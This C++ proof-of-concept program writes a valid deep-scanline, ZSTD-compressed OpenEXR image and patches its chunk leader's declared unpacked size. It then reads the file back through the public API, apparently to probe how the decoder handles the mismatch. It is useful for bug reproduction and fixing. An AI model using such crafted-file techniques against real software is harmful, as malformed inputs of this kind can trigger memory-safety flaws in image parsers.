// Builds a valid deep-scanline, ZSTD-compressed EXR with the public writer
// API, shrinks the pixel chunk's declared unpacked size in its chunk leader,
// then reads the file back through the public DeepScanLineInputFile API.
//
// Usage: residual [path]   (default /tmp/residual_poc.exr)

#include <ImfChannelList.h>
#include <ImfCompression.h>
#include <ImfDeepFrameBuffer.h>
#include <ImfDeepScanLineInputFile.h>
#include <ImfDeepScanLineOutputFile.h>
#include <ImfHeader.h>
#include <ImfPartType.h>

#include <half.h>

#include <cstdint>
#include <cstdio>
#include <cstdlib>
#include <cstring>
#include <iostream>
#include <vector>

using namespace OPENEXR_IMF_NAMESPACE;
using namespace IMATH_NAMESPACE;

static const int WIDTH   = 64;
static const int SAMPLES = 4;

static void
writeValid (const char* path)
{
    Header header (WIDTH, 1);
    header.setType (DEEPSCANLINE);
    header.compression () = ZSTD_COMPRESSION;
    header.channels ().insert ("A", Channel (HALF));

    std::vector<unsigned int>       sampleCount (WIDTH, SAMPLES);
    std::vector<std::vector<half>>  data (WIDTH, std::vector<half> (SAMPLES, half (1.5f)));
    std::vector<half*>              ptrs (WIDTH);
    for (int i = 0; i < WIDTH; ++i) ptrs[i] = data[i].data ();

    remove (path);
    DeepScanLineOutputFile file (path, header);

    DeepFrameBuffer fb;
    fb.insertSampleCountSlice (Slice (
        UINT,
        (char*) sampleCount.data (),
        sizeof (unsigned int),
        sizeof (unsigned int) * WIDTH));
    fb.insert (
        "A",
        DeepSlice (
            HALF,
            (char*) ptrs.data (),
            sizeof (half*),
            sizeof (half*) * WIDTH,
            sizeof (half)));
    file.setFrameBuffer (fb);
    file.writePixels (1);
}

static uint32_t
rd32 (const std::vector<uint8_t>& b, size_t off)
{
    return (uint32_t) b[off] | ((uint32_t) b[off + 1] << 8) |
           ((uint32_t) b[off + 2] << 16) | ((uint32_t) b[off + 3] << 24);
}

static uint64_t
rd64 (const std::vector<uint8_t>& b, size_t off)
{
    return (uint64_t) rd32 (b, off) | ((uint64_t) rd32 (b, off + 4) << 32);
}

static void
wr64 (std::vector<uint8_t>& b, size_t off, uint64_t v)
{
    for (int i = 0; i < 8; ++i) b[off + i] = (uint8_t) ((v >> (8 * i)) & 0xff);
}

// Walk the attribute list to the end of the header, then locate the first
// chunk through the line-offset table and shrink the deep chunk leader's
// unpacked-data-size field.
static void
shrinkUnpackedSize (const char* path, uint64_t delta)
{
    FILE* f = fopen (path, "rb");
    if (!f) { perror ("fopen"); exit (1); }
    fseek (f, 0, SEEK_END);
    long sz = ftell (f);
    fseek (f, 0, SEEK_SET);
    std::vector<uint8_t> b ((size_t) sz);
    if (fread (b.data (), 1, (size_t) sz, f) != (size_t) sz) exit (1);
    fclose (f);

    size_t off = 8; // magic + version
    for (;;)
    {
        if (b[off] == 0) { ++off; break; } // empty name: end of header
        while (b[off] != 0) ++off;         // attribute name
        ++off;
        while (b[off] != 0) ++off; // attribute type
        ++off;
        uint32_t asz = rd32 (b, off);
        off += 4 + asz;
    }

    uint64_t chunk0 = rd64 (b, off); // first entry of the line offset table
    if (chunk0 == 0 || chunk0 + 28 > (uint64_t) sz)
    {
        std::cerr << "unexpected file layout\n";
        exit (1);
    }

    // Deep scanline chunk leader: y (4), packed sample-count size (8),
    // packed data size (8), unpacked data size (8).
    size_t   uoff = (size_t) chunk0 + 4 + 8 + 8;
    uint64_t u    = rd64 (b, uoff);
    std::cerr << "chunk at " << chunk0 << ", declared unpacked size " << u
              << " -> " << (u - delta) << "\n";
    wr64 (b, uoff, u - delta);

    f = fopen (path, "wb");
    if (!f) { perror ("fopen"); exit (1); }
    fwrite (b.data (), 1, b.size (), f);
    fclose (f);
}

static void
readBack (const char* path)
{
    DeepScanLineInputFile file (path);
    const Box2i&         dw    = file.header ().dataWindow ();
    int                  width = dw.max.x - dw.min.x + 1;

    std::vector<unsigned int> sampleCount ((size_t) width, 0);
    std::vector<half*>        ptrs ((size_t) width, nullptr);
    std::vector<std::vector<half>> storage ((size_t) width, std::vector<half> (SAMPLES, half (0)));
    for (int i = 0; i < width; ++i) ptrs[i] = storage[i].data ();

    DeepFrameBuffer fb;
    fb.insertSampleCountSlice (Slice (
        UINT,
        (char*) (sampleCount.data () - dw.min.x - dw.min.y * width),
        sizeof (unsigned int),
        sizeof (unsigned int) * width));
    fb.insert (
        "A",
        DeepSlice (
            HALF,
            (char*) (ptrs.data () - dw.min.x - dw.min.y * width),
            sizeof (half*),
            sizeof (half*) * width,
            sizeof (half)));
    file.setFrameBuffer (fb);

    file.readPixels (dw.min.y, dw.max.y);

    std::cout << "decoded without error\n";
}

int
main (int argc, char** argv)
{
    const char* path = (argc > 1) ? argv[1] : "/tmp/residual_poc.exr";
    writeValid (path);
    shrinkUnpackedSize (path, 8);
    try
    {
        readBack (path);
    }
    catch (const std::exception& e)
    {
        std::cout << "read failed cleanly: " << e.what () << "\n";
        return 0;
    }
    return 0;
}
